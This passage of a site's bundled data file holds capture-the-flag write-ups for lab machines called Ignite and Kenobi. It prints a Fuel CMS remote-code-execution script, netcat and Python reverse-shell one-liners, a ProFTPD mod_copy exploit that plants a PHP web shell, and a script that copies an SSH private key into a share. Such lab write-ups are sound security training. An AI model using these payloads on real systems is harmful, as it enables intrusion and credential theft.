hole pt1)","description":"Accessing Fuel CMS admin panel revealed in robots.txt and tryin to upload files"},{"section":"RCE - Remote Code Execution","description":"Searching Fuel CMS CVE with searchsploit and found RCE - Remote Code Execution"},{"section":"Reverse shell","description":"Upgrade to a stable shell by employing a reverse shell with Netcat"},{"section":"Change shell","description":"Upgrade shell with python"},{"section":"Searching for interesting files","description":"Analyzing PHP configuration files and find credentials. Privesc - privilege escalation with the credentials"},{"section":"Privilege escalation","description":"Employed python web server to download file with powershell command in Linux environment."}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Ign</span>ite</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/ignite/banner.gif\\" alt=\\"\\"><hr>"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<br><pre>Nmap 7.91 scan initiated Thu Sep 16 15:42:21 2021 as: nmap -sC -sV -A -p- -oN nmap 10.10.238.237<br>Nmap scan report for ip-10-10-238-237.eu-west-1.compute.internal (10.10.238.237)<br>Host is up (0.014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>| http-robots.txt: 1 disallowed entry <br>|_/fuel/<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Welcome to FUEL CMS<br>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.91%E=4%D=9/16%OT=80%CT=1%CU=35981%PV=Y%DS=2%DC=T%G=Y%TM=614357F<br>OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS<br>OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1<br>OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN<br>OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A<br>OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R<br>OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F<br>OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%<br>OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD<br>OS:=S)</pre>","<p>The only port open is the 80 which means it has a website. I must check it!</p>"]},{"id":"Web analysis (Rabbit hole pt1)","title":"<h1><span style=\\"color:#da1953\\">Web</span> analysis (Rabbit hole pt1)</h1>","body":["<p>Once on the web page, the only thing I see is the welcome page of a default <strong>Fuel CMS</strong> welcome page.</p>","<p>At this point, I immediately went to check <em>robots.txt</em>. Why <em>robots.txt</em>?<br></p>","<ol><li>Because <em>Nmap</em> tells me about this file.<img src=\\"/cyber/writeup/ignite/37cad67d89754a1ebfd6c3705b710249.png\\"></li><li>It is a good practice to check it you never know.</li></ol>","<p>The file <em>robots.txt</em> show as follows:</p>","<pre>User-agent: *<br>Disallow: /fuel/</pre>","<p>So let me check the path. It leads to the login page of the cms.<br></p>","<img src=\\"/cyber/writeup/ignite/6599a6a905b64b6386f9fa3348d6cb6f.png\\">","<p>Since I don\'t have the credentials, the only thing I can think of to do is to try the default Fuel CMS credentials which turn out to be <code>admin:admin</code>.</p>","<p>Once logged in and taking a look around I found an upload page.<br>","<img src=\\"/cyber/writeup/ignite/777da69cd431492d8df35bdc14d859ad.png\\"></p>","<p>Now, I have tried many php reverse shell pages taken from GitHub and Pentestmonkey but none of them worked and keep giving me errors.</p>","<p><img src=\\"/cyber/writeup/ignite/438cf6338e214538ab4339d52ee67b31.png\\"></p>","<p>After some research, it seems that to fix this error I have to get my hands on the php configuration file which is not possible for me at the moment.<br><a href=\'https://stackoverflow.com/questions/45992685/php-parse-error-syntax-error-unexpected-in-helpers-php-233\'>php-parse-error-syntax-error-unexpected-in-helpers-php-233</a>.</p>","<p>I have spent quite a lot of time at this point trying to write a better reverse shell in PHP in order to upload but I think it is a <a data-from-md title=\'https:/medium.com/@luke.williams1248/on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5\' href=\'https://medium.com/@luke.williams1248on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5\'>RabbitHole</a>.</p>","<p>Then I moved on and tried another way.</p>"]},{"id":"RCE - Remote Code Execution","title":"<h1><span style=\\"color:#da1953\\">RCE</span> - Remote Code Execution</h1>","body":["<p>Now I take a step back and see what other information I have.</p>","<p>Getting back on the main Fuel CMS page I can see the version installed, so the first thing that comes to my mind is that it might have a vulnerability and an exploit.</p>","<p>So I search with <code>searchsploit fuel</code>.</p>","<pre>searchsploit fuel                  <br>-------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                        |  Path<br>-------------------------------------------------------------------------------------- ---------------------------------<br>AMD Fuel Service - \'Fuel.service\' Unquote Service Path                                | windows/local/49535.txt<br>Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                     | hardware/webapps/31180.txt<br>fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py<br>Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb<br>Fuel CMS 1.4.7 - \'col\' SQL Injection (Authenticated)                                  | php/webapps/48741.txt<br>Fuel CMS 1.4.8 - \'fuel_replace_id\' SQL Injection (Authenticated)                      | php/webapps/48778.txt<br>-------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><pre>","<p>Among all those, the one that convinces me the most is the Python RCE, called <strong>Remote Code Execution (1)</strong>.</p>","<p>To copy it I can <code>searchsploit -m 47138</code> (without the file format <em>.py</em>)</p>","<pre>┌──(benwick㉿benwick)-[~]<br>└─$ searchsploit -m 47138<br>  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)<br>      URL: https://www.exploit-db.com/exploits/47138<br>     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py<br>File Type: Python script, ASCII text executable<br><br>Copied to: /home/kali/47138.py<br></pre>","<p>Now I have to set the exploit properly. By opening the code I can see that it is using a proxy in order to communicate with the remote target which I don\'t want so I readjust the code.</p>","<pre class=\\"python-code\\"><span class=\\"keyword\\">import</span> requests<br><span class=\\"keyword\\">import</span> urllib<br><br><span class=\\"variable\\">url</span> = <span class=\\"string\\">\\"http://10.10.81.104\\"</span><br><span class=\\"keyword\\">def</span> <span class=\\"function\\">find_nth_overlapping</span>(<span class=\\"variable\\">haystack</span>, <span class=\\"variable\\">needle</span>, <span class=\\"variable\\">n</span>):<br>    <span class=\\"variable\\">start</span> = <span class=\\"variable\\">haystack</span>.find(<span class=\\"variable\\">needle</span>)<br>    <span class=\\"keyword\\">while</span> <span class=\\"variable\\">start</span> >= 0 <span class=\\"keyword\\">and</span> <span class=\\"variable\\">n</span> > 1:<br>        <span class=\\"variable\\">start</span> = <span class=\\"variable\\">haystack</span>.find(<span class=\\"variable\\">needle</span>, <span class=\\"variable\\">start</span>+1)<br>        <span class=\\"variable\\">n</span> -= 1<br>    <span class=\\"keyword\\">return</span> <span class=\\"variable\\">start</span><br><br><span class=\\"keyword\\">while</span> 1:<br>    xxxx = raw_input(<span class=\\"string\\">\\"cmd:\\"</span>)<br>    burp0_url = <span class=\\"variable\\">url</span>+<span class=\\"string\\">\\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\\"</span>\\\\<br>+urllib.quote(<span class=\\"variable\\">xxxx</span>)+<span class=\\"string\\">\\"%27%29%2b%27\\"</span><br>    <span class=\\"comment\\">#proxy = {\\"http\\":\\"http://127.0.0.1:8080\\"}</span><br>    r = requests.get(<span class=\\"variable\\">burp0_url</span>)<span class=\\"comment\\">#, proxies=proxy)</span><br><br>    html = <span class=\\"string\\">\\"<!DOCTYPE html>\\"</span><br>    htmlcharset = r.text.find(<span class=\\"variable\\">html</span>)<br><br>    begin = r.text[0:20]<br>    dup = <span class=\\"function\\">find_nth_overlapping</span>(r.text, <span class=\\"variable\\">begin</span>, 2)<br><br>    <span class=\\"function\\">print</span> r.text[0:dup]<br></pre>","<p>Now that I have removed part of the code and set the url to the target url I am ready to execute it in order to get RCE.</p>","<p>NOTE: It is a Python script, at the time I wrote this writeup (17/09/2021) in every Linux distro python3 is the default Python and in most of them python2 is not even installed.<br>I had a few errors on running the script because I was executing the script with just <code>./47138.py</code> which uses python3 by default but this code seems working with python2 so I had to use <code>python2 47138.py</code> and managed to run it successfullyZ.</p>","<pre>┌──(benwick㉿benwick)-[~]<br>└─$ python2 ./47138.py <br>cmd:<br></pre>","<p></p>"]},{"id":"Reverse shell","title":"<h1><span style=\\"color:#da1953\\">Rev</span>erse shell</h1>","body":["<p>The shell I got is limiting me, and can not travel the directories. It means I need a better shell so I need a reverse shell.</p>","<p>The first thing to do is to open a Netcat listener: <code>nc -lvnp 1234</code></p>","<p>I used the pentestermonkey website to get the reverse shell command which is:<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code><br>and changed the IP address with the target address.</p>","<p>NOTE: Why did I use the previous command and not the other one on the site which is shorter and easier to understand?<br><code>nc -e /bin/sh 10.0.0.1 1234</code>. This simply didn\'t work, I tried both.</p>","<p><img src=\\"/cyber/writeup/ignite/70ffe32a7e9a44ba9336716b1f3b523b.png\\"></p>"]},{"id":"User flag","title":"<h1><span style=\\"color:#da1953\\">Use</span>r flag</h1>","body":["<p>Now I can freely navigate and get the flag from the user folder.<br><img src=\\"/cyber/writeup/ignite/622d46e05de64b6cbd50c59b191e9825.png\\"></p>"]},{"id":"Rabbit hole pt2 - LinPEAS","title":"<h1><span style=\\"color:#da1953\\">Rab</span>bit hole pt2 - LinPEAS</h1>","body":["<p>As <a href=\\"https://www.linkedin.com/in/ippsec/\\"  target=\\"blank\\" rel=\\"noopener noreferrer\\">IPPSec</a> teaches one, the best way to enumerate a machine is through linpeas (winpeas). Once downloaded and run (no details about these steps because it failed) it gave a huge report that leads nowhere.</p>"]},{"id":"Searching for interesting files","title":"<h1><span style=\\"color:#da1953\\">Sea</span>rching for interesting files</h1>","body":["<p>At this point, I started looking at the files in the <strong>/var/www/html/fuel</strong> folder.</p>","<p>Why in particular this folder? No particular reason this is the folder from where I started and need to check the whole box so eventually I will check this. I am lucky because the solution for the next step is here.</p>","<p>By navigating inside the folder at a certain point I reached the file <strong>/var/www/html/fuel/application/config/database.php</strong> which contains the password for the administrator account.</p>","<p>To view the file I can just <code>cat database.php</code></p>","<p><img src=\\"/cyber/writeup/ignite/815d893c60c049aa83450ce0bca3e3da.png\\"></p>"]},{"id":"Change shell","title":"<h1><span style=\\"color:#da1953\\">Cha</span>nge shell</h1>","body":["<p>Sometimes happens that simpli using the <code>cat</code> command doesn\'t work and it says: <i>Command : must be run from a terminal</i>. In order to have a better shell I can run the following command:<code>python -c \'import pty; pty.spawn(&quot;/bin/bash&quot;)\'</code></p>","<p><img src=\\"/cyber/writeup/ignite/0364d820431744c1a5604b168e6c7eac.png\\"></p>"]},{"id":"Root flag","title":"<h1><span style=\\"color:#da1953\\">Roo</span>t flag</h1>","body":["<p>Finally, to get the root flag I have to elevate the privilege. While I have the username and the password I can simply switch the user <code>su root</code> and enter the password to become root and read the root flag.</p>","<p><img src=\\"/cyber/writeup/ignite/1a5ee7c350e04dfb873ad7f82f23537e.png\\"></p>"]}]}]}')},9123:e=>{"use strict";e.exports=JSON.parse('{"files":["writeupdb/vulnet-roasted.json","writeupdb/kenobi.json","writeupdb/blue.json","writeupdb/cyber-lens.json","writeupdb/thompson.json","writeupdb/lightroom.json","writeupdb/lookup.json","writeupdb/tomghost.json","writeupdb/threat-hunting-with-yara.json","writeupdb/tomcat.json","writeupdb/archetype.json","writeupdb/picklerick.json","writeupdb/ignite.json","writeupdb/buff.json","writeupdb/uni-ctf.json"],"next":["writeupdb/brooklyn99.json"]}')},1401:e=>{"use strict";e.exports=JSON.parse('{"title":"Kenobi","path":"kenobi","tags":["easy","ctf","box","thm","cve","linux","smb","ejpt","oscp","proftpd 1.3.5","nsf"],"date":"APR 2025","location":"./writeup/","banner":"writeup/kenobi/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with nmap and finding the host exposing posts 21 proftpd, 22 ssh, 111 rpcbind, 139 netbios-ssn, 445 netbios-ssn and 2049 nfs"},{"section":"Web service","description":"Enumeratin webservice port 80 and performing url bruteforcing with Gobuster including file extension"},{"section":"SMB","description":"Enumratin SMB service with netexec to find accessible shares"},{"section":"SMB","description":"Accessing SMB share with smbclient and downloading log file"},{"section":"Exploit explanation","description":"Understanding profptd 1.3.5 vulnerability due to mod_cpy module CVE-2015-3306"},{"section":"Rewrite the exploit","description":"Rewruting proftpd 1.3.5 exploit to adapt it in my scenario"},{"section":"Rewrite the exploit","description":"Retrieving id_rsa by employing CVE-2-15-3306 proftpd 1.3.5 vulnerability via SMB share"},{"section":"Access as Kenobi","description":"Accessing remote host via SSH with id_rsa without the need of password"},{"section":"Host enumeration","description":"Enumerating target host with Linpeas to find user installed programs"},{"section":"Hijacking execution","description":"A malicious version of the <i>ifconfig</i> command was placed in the first directory listed in the PATH environment variable. This causes the menu program, when executed, to run the malicious version instead of the legitimate one, ultimately triggering the execution of an elevated privileged shell"},{"section":"Enumerating NFS","description":"Enumerating NSF with nmap"},{"section":"Access and exploit ProFTPD via NetCat","description":"Access, interact and exploit ProFTPD 1.3.5 with NC (NetCat) to copy SSH private key into the share"},{"section":"Mounting NFS to retrieve SSH private key","description":"Mounting NFS to access and retrieve SSH privare key id_rsa"}],"body":[{"id":"Blue","title":"<h1> <span style=\\"color:#da1953\\">Ken</span>obi</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/kenobi/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre># Nmap 7.94SVN scan initiated Thu Mar 27 06:47:10 2025 as: nmap -sC -sV -oN nmap 10.10.83.151<br>Nmap scan report for 10.10.83.151<br>Host is up (0.054s latency).<br>Not shown: 993 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         ProFTPD 1.3.5<br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)<br>|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)<br>|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Site doesn\'t have a title (text/html).<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-robots.txt: 1 disallowed entry <br>|_/admin.html<br>111/tcp  open  rpcbind     2-4 (RPC #100000)<br>|_rpcinfo: ERROR: Script execution failed (use -d to debug)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>2049/tcp open  nfs         2-4 (RPC #100003)<br>Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: kenobi<br>|   NetBIOS computer name: KENOBI\\\\x00<br>|   Domain name: \\\\x00<br>|   FQDN: kenobi<br>|_  System time: 2025-03-27T05:47:22-05:00<br>|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s<br>| smb2-time: <br>|   date: 2025-03-27T10:47:22<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Mar 27 06:47:25 2025 -- 1 IP address (1 host up) scanned in 15.55 seconds<br></pre></p>","<p>I have 7 open ports: 21 proftpd, 22 ssh, 80 http, 111 rpcbind, 139 netbios-ssn, 445 netbios-ssn and 2049 nfs.</p>"]},{"id":"Enumeration","title":"<h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":[{"id":"Web service","title":"<h2>Web service</h2>","body":["I started with the web service because it has the most common attack vector for initial footholds. From the Nmap, I can see robots.txt and an admin.txt page.","<p><pre>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Site doesn\'t have a title (text/html).<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-robots.txt: 1 disallowed entry <br>|_/admin.html</pre></p>","<p>The admin page is just a rabbit hole, nothing is there, I also tried to analyze the source code and it is simply a pure HTML code.</p>","<p><img src=\\"/cyber/writeup/kenobi/trap.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/kenobi/admincode.PNG\\" alt=\\"\\"></p>","<p>Additionally, I tried URL brute force to find hidden pages with extension options with Gobuster but did not find anything.</p>","<p><pre><b>$</b> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.156.3 -x .php,.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.156.3<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/robots.txt           (Status: 200) [Size: 36]<br>Progress: 244929 / 244932 (100.00%)<br>===============================================================<br>Finished<br>===============================================================</pre></p>"]},{"id":"SMB","title":"<h2>SMB</h2>","body":["<p>To enumerate SMB shares and determine their permissions, you can use a variety of commands. You can also find a good list on <a href=\\"https://0xdf.gitlab.io/cheatsheets/smb-enum\\">0xdf website</a>.</p>","<p><pre><b>$ </b>netexec smb 10.10.156.3 -u \'anythingyouwant\' -p \'\' --shares<br>SMB         10.10.156.3     445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)<br>SMB         10.10.156.3     445    KENOBI           [+] \\\\anythingyouwant: <br>SMB         10.10.156.3     445    KENOBI           [*] Enumerated shares<br>SMB         10.10.156.3     445    KENOBI           Share           Permissions     Remark<br>SMB         10.10.156.3     445    KENOBI           -----           -----------     ------<br>SMB         10.10.156.3     445    KENOBI           print<b>$ </b>                         Printer Drivers<br>SMB         10.10.156.3     445    KENOBI           anonymous       READ            <br>SMB         10.10.156.3     445    KENOBI           IPC<b>$ </b>                           IPC Service (kenobi server (Samba, Ubuntu))<br></pre></p>","<p>I have read permission on the anonymous share.  It means I can access and read but not upload any files.</p>","<p><pre><b>$ </b>smbclient &apos;\\\\\\\\10.10.156.3\\\\anonymous&apos;<br>Password for [WORKGROUP\\\\kali]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\&gt; ls<br>  .                                   D        0  Wed Sep  4 06:49:09 2019<br>  ..                                  D        0  Wed Sep  4 06:56:07 2019<br>  log.txt                             N    12237  Wed Sep  4 06:49:09 2019<br>9204224 blocks of size 1024. 6852964 blocks available<br>smb: \\\\&gt; get log.txt<br>getting file \\\\log.txt of size 12237 as log.txt (76.1 KiloBytes/sec) (average 76.1 KiloBytes/sec)</pre></p>","<p>When the command asks for the password insert your Kali Linux password. To analyze the log.txt I downloaded it so I can open it with my preferred text editor.</p>","<p>Reading the log file I can see many interesting things:</p>","<p><i><ul><li>Your identification has been saved in /home/kenobi/.ssh/id_rsa.</li><li># Set the user and group under which the server will run.<br>User kenobi<br>Group kenobi</li><li># We want clients to be able to login with \\"anonymous\\" as well as \\"ftp\\"<br>UserAlias anonymous ftp</li><li>[anonymous]<br>path = /home/kenobi/share</li></ul></i></p>","<p>Combining this information with the version of Proftpd 1.3.5 which is vulnerable I can obtain sensitive information, let\'s see whats <a href+\\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306\\">mitre.org</a> says about this vulnerability</p>","<p><blockquote>The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.</blockquote></p>","<p>Basically, I can copy files from one destination to another without being authenticated. This is achieved with the FTP commands CPFR (copy from) and CPTO (copy to), they set the source and the destination. This obviously has no impact on me not giving me remote access, but if I combine it with the information found in the log file I will be able to gain access to the machine.</p>","<p>First of all, I know that I have access to the share \\"<i>anonymous</i>\\" and the location as well which is <b>/home/kenobi/share</b>. If I copy files in that directory I will be able to retrieve them via SMB as I did with the log file.</p>","<p>Now the file I want to copy is just not a random file but some sensitive file that is mentioned in the log which is the id_rsa that is required to log in via SSH without the password. This file location is mentioned in the log file as well, <b>/home/kenobi/.ssh/id_rsa</b>.</p>"]}]},{"id":"Exploiting ProFTPD","title":"<h1><span style=\\"color:#da1953\\">Exp</span>loiting ProFTPD</h1>","body":["<p>To exploit ProFTPD I first searched with nsfvenom, and although I found 2 exploits I did not understand what they did by reading the code as it is my first time dealing with FTP exploits.</p>","<p><img src=\\"/cyber/writeup/kenobi/searchsploit.PNG\\" alt=\\"\\"></p>","<p>Then I started to search for different exploits and found this on <a href=\\"https://github.com/synack-jmason/proftpd-1.3.5-reverse-shell-exploit/blob/main/exploit.py\\">GitHub</a> which is minimalistic and easy to understand. I let ChatGPT explain the code line by line and the logic behind it.</p>","<p><pre class=\\"python-code\\"><span class=\\"comment\\">#!/usr/bin/env python3</span><br><br><span class=\\"keyword\\">import</span> socket<br><span class=\\"keyword\\">import</span> requests<br><br><span class=\\"variable\\">shell</span> = <span class=\\"string\\">\\"python -c \'import os, socket;s=socket.socket();s.connect((\\\\\\\\\\"192.168.229.30\\\\\\\\\\", 9001));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);os.system(\\\\\\\\\\"/bin/sh\\\\\\\\\\")\'\\"</span><br><br><span class=\\"keyword\\">with</span> socket.socket() <span class=\\"keyword\\">as</span> s:<br>        s.connect((<span class=\\"string\\">\'192.168.229.105\'</span>, <span class=\\"number\\">21</span>))<br>        s.send(b<span class=\\"string\\">\\"SITE CPFR /proc/self/cmdline\\\\n\\"</span>)<br>        s.send(b<span class=\\"string\\">\\"SITE CPTO /tmp/&lt;?php system($_GET[\'c\']) ?&gt;\\\\n\\"</span>)<br>        s.send(b<span class=\\"string\\">\\"SITE CPFR /tmp/&lt?php system($_GET[\'c\']) ?&gt;\\\\n\\"</span>)<br>        s.send(b<span class=\\"string\\">\\"SITE CPTO /var/www/html/anything.php\\\\n\\"</span>)<br><br><span class=\\"variable\\">r</span> = requests.get(<span class=\\"string\\">\\"http://192.168.229.105/anything.php\\"</span>, params={<span class=\\"string\\">\'c\'</span>: shell,})<br>  </pre></p>",{"id":"Exploit explanation","title":"<h2>Exploit explanation</h2>","body":["<p>​The four lines of code interact with an FTP server to exploit a vulnerability in ProFTPD\'s <code>mod_copy</code> module, specifically <b>CVE-2015-3306</b>. Let\'s break down each line and explain how they work together:</p>","<p><code>s.send(b\\"SITE CPFR /proc/self/cmdline\\n\\")</code><br>This line sends the <code>SITE CPFR</code> command to the FTP server, specifying <code>/proc/self/cmdline</code> as the source file. In ProFTPD, <code>SITE CPFR</code> (Copy From) is used to specify the file to be copied. The <code>/proc/self/cmdline</code> file contains the command-line arguments of the current process. By targeting this file, the attacker aims to read data that can be manipulated in subsequent steps.</p>","<p><code>s.send(b\\"SITE CPTO /tmp/&lt;?php system($_GET[\'c\']) ?&gt;\\n\\")</code><br>This line sends the <code>SITE CPTO</code> command, specifying the destination file path as <code>/tmp/<?php system($_GET[\'c\']) ?></code>. In ProFTPD, <code>SITE CPTO</code> (Copy To) is used to specify the destination file for the copy operation. Here, the destination filename itself contains PHP code (<code>&lt;?php system($_GET[\'c\']) ?&gt;</code>). Due to the way ProFTPD handles these commands, the filename is created as specified, effectively writing the PHP code into the filename. This behavior exploits the vulnerability, allowing the creation of files with arbitrary names that include executable code.</p>","<p>In the ProFTPD <code>mod_copy</code> exploit, attackers often choose <code>/proc/self/cmdline</code> as the source file because it\'s a file that the FTP server process can reliably read without encountering permission issues. This ensures the copy operation proceeds smoothly. The actual content of <code>/proc/self/cmdline</code> isn\'t significant for the exploit; the key aspect is the ability to create a new file with a malicious name or content in a location accessible by the web server. This method leverages the FTP server\'s permissions to facilitate unauthorized file creation.</p>","<p><code>s.send(b\\"SITE CPFR /tmp/&lt;?php system($_GET[\'c\']) ?&gt;\\n\\")</code><br>This line sends another <code>SITE CPFR</code> command, this time specifying the file just created (<code>/tmp/&lt;?php system($_GET[\'c\']) ?&gt;</code>) as the source file for a new copy operation. This step prepares to move the malicious file to a location where it can be executed via a web server.</p>","<p><code>s.send(b\\"SITE CPTO /var/www/html/anything.php\\n\\")</code><br>Finally, this line sends the <code>SITE CPTO</code> command to copy the file from <code>/tmp/&lt;?php system($_GET[\'c\']) ?&gt;</code> to <code>/var/www/html/anything.php</code>. Assuming the web server serves files from <code>/var/www/html/</code>, the attacker can now access <code>anything.php</code> via a web browser. When accessed, this PHP file will execute the command specified in the <code>c</code> parameter of the URL query string, allowing remote code execution on the server.</p>","<p>How the PHP Code Ends Up Inside the File?</p>","<p>Typically, FTP operations involve copying existing files rather than creating new files with arbitrary content. However, due to the vulnerability in ProFTPD\'s <code>mod_copy</code> module, the FTP server fails to properly sanitize input and handle permissions. This oversight allows attackers to create files with names that include executable code. In this exploit, the filename itself contains PHP code, and when the file is placed in a web-accessible directory, the web server interprets and executes the code within the filename.</p>","<p>Now I have to adapt this code for my scenario as I do not have PHP.</p>"]},{"id":"Rewrite the exploit","title":"<h2>Rewrite the exploit</h2>","body":["Once understood the code I was able to craft my version that applies in this scenario. As I do not have PHP I have to adapt the code to copy the <code>id_rsa</code> into <code>/home/kenobi/share</code>. Follwoing the new explot:","<p><pre class=\\"python-code\\"><br><span class=\\"keyword\\">import</span> socket<br><br><span class=\\"comment\\"># FTP server details</span><br><span class=\\"variable\\">ftp_server</span> = <span class=\\"string\\">\'10.10.60.162\'</span><br><span class=\\"variable\\">ftp_port</span> = <span class=\\"number\\">21</span><br><br><span class=\\"comment\\"># Source and destination paths</span><br><span class=\\"variable\\">source_file</span> = <span class=\\"string\\">\'/home/kenobi/.ssh/id_rsa\'</span><br><br><span class=\\"variable\\">destination_file</span> = <span class=\\"string\\">\'/home/kenobi/share/id_rsa\'</span><br><span class=\\"comment\\"># Connect to the FTP server</span><br><br><span class=\\"keyword\\">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class=\\"keyword\\">as</span> s:<br>    s.connect((ftp_server, ftp_port))<br>    <span class=\\"variable\\">response</span> = s.recv(<span class=\\"number\\">1024</span>)<br>    <span class=\\"function\\">print</span>(response.decode())<br><br>    <span class=\\"comment\\"># Send SITE CPFR command to specify the source file</span><br>    s.sendall(f<span class=\\"string\\">\'SITE CPFR {source_file}\\\\n\'</span>.encode())<br>    response = s.recv(<span class=\\"number\\">1024</span>)<br>    <span class=\\"function\\">print</span>(response.decode())<br><br>    <span class=\\"comment\\"># Send SITE CPTO command to specify the destination file</span><br>    s.sendall(f<span class=\\"string\\">\'SITE CPTO {destination_file}\\\\n\'</span>.encode())<br>    response = s.recv(<span class=\\"number\\">1024</span>)<br>    <span class=\\"function\\">print</span>(response.decode())<br>  </pre></p>","<p><pre><b>$ </b>python3 myexp.py <br>220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.184.80]<br>350 File or directory exists, ready for destination name<br>250 Copy successful<br></pre></p>","<p>Now that the copy is completed I can check if I can find it in the share named anonymous.</p>","<p><pre><b>$ </b>smbclient \'\\\\\\\\10.10.184.80\\\\anonymous\'<br>Password for [WORKGROUP\\\\kali]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\&gt; ls<br>  .                                   D        0  Sat Mar 29 08:56:11 2025<br>  ..                                  D        0  Wed Sep  4 06:56:07 2019<br>  id_rsa                              N     1675  Sat Mar 29 08:56:11 2025<br>  log.txt                             N    12237  Wed Sep  4 06:49:09 2019<br><br>9204224 blocks of size 1024. 6877112 blocks available<br>smb: \\\\&gt; </pre></p>","<p>The private key is in the share, now I can download and use it.</p>","<p><pre>smb: \\\\&gt; get id_rsa<br>getting file \\\\id_rsa of size 1675 as id_rsa (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)<br>smb: \\\\&gt; <br></pre></p>"]}]},{"id":"Access as Kenobi","title":"<h1><span 